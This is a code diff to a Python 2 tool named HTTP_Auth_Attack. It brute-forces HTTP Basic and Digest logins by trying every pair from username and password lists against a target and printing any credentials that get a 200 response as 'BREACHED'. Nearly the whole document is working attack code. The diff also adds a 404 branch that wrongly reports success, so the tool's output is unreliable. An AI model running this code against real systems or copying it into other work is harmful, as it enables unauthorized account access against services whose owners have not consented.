@@ -10,7 +10,6 @@ import sys
 import re
 
 from requests.auth import HTTPDigestAuth
-from datetime import datetime
 
 class HTTP_Auth_Attack(object):
 
@@ -41,7 +40,7 @@ class HTTP_Auth_Attack(object):
             if not r.status_code == 401:
                 print("\t--> [\033[91mx\033[0m] - '%s' did not reply with http authentication challange (\033[91mno 401 response\033[0m).\n") % (self.target)
                 sys.exit(2)
-            else:
+            elif r.status_code == 401:
                 print("\t--> [\033[92m!\033[0m] HTTP Authentication Detected!\n")
 
                 http_auth_string = r.headers['www-authenticate']
@@ -53,52 +52,64 @@ class HTTP_Auth_Attack(object):
                 if not http_auth_scheme:
                     print("\t--> [\033[91mx\033[0m] - '\033[91mError trying to determine auth scheme\033[0m' from '%s'. Exiting.\n") % (self.target)
                     sys.exit(2)
+                elif http_auth_scheme.lower() == 'basic':
+                    for _user in self.userlist:
+                        for _pass in self.passlist:
+                            self.basic_auth(_user, _pass)
+                    print '\n'
+                    print("\t--> [?] - Sorry... could not find a successful username/password combination.\n")
+
+                elif http_auth_scheme.lower() == 'digest':
+                    for _user in self.userlist:
+                        for _pass in self.passlist:
+                            self.digest_auth(_user, _pass)
+                    print '\n'
+                    print("\t--> [?] - Sorry... could not find a successful username/password combination.\n")
 
                 if not http_auth_realm:
                     print("\t--> [\033[91mx\033[0m] - '\033[91mError trying to determine auth realm\033[0m' from '%s'. Exiting.\n") % (self.target)
                     sys.exit(2)
+                else:
+                    print "Return:" + str(r.status_code)
 
-                #Basic Auth
-                if http_auth_scheme.lower() == 'basic':
-                    print("\t--> [\033[92m!\033[0m] HTTP Authentication Type: '\033[;1mBasic\033[0m' \n")
-                    for _user in self.userlist:
-                        for _pass in self.passlist:
-                            self.attempts+=1
-                            basic_r = requests.post(self.target, auth=(_user, _pass))
-                            print("\t--> [\033[92m!\033[0m] Attempting Breach with user:\033[;1m%10s\033[0m and password:\033[;1m %15s\033[0m\033[1A") % (_user, _pass)
-                            if basic_r.status_code == 200:
-                                print '\n'
-                                print("\r\t-----> [\033[92m!\033[0m] \033[;1m\033[92mSUCCESS!\033[0m HTTP Authentication Scheme BREACHED after %d attempts!\n") % (self.attempts)
-                                print("\t-----> [\033[92m!\033[0m]\033[;1m Username: '%s'\n\n\t\033[0m-----> [\033[92m!\033[0m]\033[;1m Password: '%s'\033[0m\n") % (_user, _pass)
-                                sys.exit(1)
-                            else:
-                                continue
-                    print("\t--> [?] - Sorry... could not find a successful username/password combination.\n")
-                    sys.exit(1)
 
-                #Digest Auth
-                if http_auth_scheme.lower() == 'digest':
-                    print("\t--> [\033[92m!\033[0m] HTTP Authentication Type: '\033[;1mDigest\033[0m' \n")
-                    for _user in self.userlist:
-                        for _pass in self.passlist:
-                            self.attempts+=1
-                            digest_r = requests.post(self.target, auth=HTTPDigestAuth(_user, _pass))
-                            print("\t--> [\033[92m!\033[0m] Attempting Breach with user:\033[;1m%10s\033[0m and password:\033[;1m %15s\033[0m\033[1A") % (_user, _pass)
-                            if digest_r.status_code == 200:
-                                print '\n'
-                                print("\r\t-----> [\033[92m!\033[0m] \033[;1m\033[92mSUCCESS!\033[0m HTTP Authentication Scheme BREACHED after %d attempts!\n") % (self.attempts)
-                                print("\t-----> [\033[92m!\033[0m]\033[;1m Username: '%s'\n\n\t\033[0m-----> [\033[92m!\033[0m]\033[;1m Password: '%s'\033[0m\n") % (_user, _pass)
-                                sys.exit(1)
-                            else:
-                                continue
-                    print("\t--> [?] - Sorry... could not find a successful username/password combination.\n")
-                    sys.exit(1)
+    #Basic Auth
+    def basic_auth(self, _user, _pass):
+        basic_r = requests.post(self.target, auth=(_user, _pass))
+        self.attempts += 1
+        print("\t--> [\033[92m!\033[0m] Attempting Breach with user:\033[;1m%10s\033[0m and password:\033[;1m %15s\033[0m\033[1A") % (_user, _pass)
+        if basic_r.status_code == 200:
+            print '\n'
+            print("\r\t-----> [\033[92m!\033[0m] \033[;1m\033[92mSUCCESS!\033[0m HTTP Authentication Scheme BREACHED after %d attempts!\n") % (self.attempts)
+            print("\t-----> [\033[92m!\033[0m]\033[;1m Username: '%s'\n\n\t\033[0m-----> [\033[92m!\033[0m]\033[;1m Password: '%s'\033[0m\n") % (_user, _pass)
+            sys.exit(1)
+        elif basic_r.status_code == 404:
+            print '\n'
+            print("\r\t-----> [\033[92m!\033[0m] \033[;1m\033[92mSUCCESS!\033[0m HTTP Authentication Scheme BREACHED after %d attempts!\n") % (self.attempts)
+            print("\t-----> [\033[91mx\033[0m] \033[91mFile Not Found Error\033[0m from '%s'.\n") % (self.target)
+            sys.exit(1)
+        else:
+            pass
 
-                if http_auth_scheme.lower() == 'oauth':
-                    print("\t--> [\033[92m!\033[0m] HTTP Authentication Type: '\033[;1mOAuth\033[0m' \n")
-                    print("\t--> ^^ Coming Soon\n")
-                    sys.exit(1)
-                sys.exit(2)
+    #Digest Auth
+    def digest_auth(self, _user, _pass):
+        digest_r = requests.post(self.target, auth=HTTPDigestAuth(_user, _pass))
+        self.attempts += 1
+        print("\t--> [\033[92m!\033[0m] Attempting Breach with user:\033[;1m%10s\033[0m and password:\033[;1m %15s\033[0m\033[1A") % (_user, _pass)
+        if digest_r.status_code == 200:
+            print '\n'
+            print("\r\t-----> [\033[92m!\033[0m] \033[;1m\033[92mSUCCESS!\033[0m HTTP Authentication Scheme BREACHED after %d attempts!\n") % (self.attempts)
+            print("\t-----> [\033[92m!\033[0m]\033[;1m Username: '%s'\n\n\t\033[0m-----> [\033[92m!\033[0m]\033[;1m Password: '%s'\033[0m\n") % (_user, _pass)
+            sys.exit(1)
+        elif digest_r.status_code == 404:
+            print '\n'
+            print("\r\t-----> [\033[92m!\033[0m] \033[;1m\033[92mSUCCESS!\033[0m HTTP Authentication Scheme BREACHED after %d attempts!\n") % (self.attempts)
+            print("\t-----> [\033[91mx\033[0m] \033[91mFile Not Found Error\033[0m from '%s'.\n") % (self.target)
+            sys.exit(1)
+        else:
+            pass
+
+
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
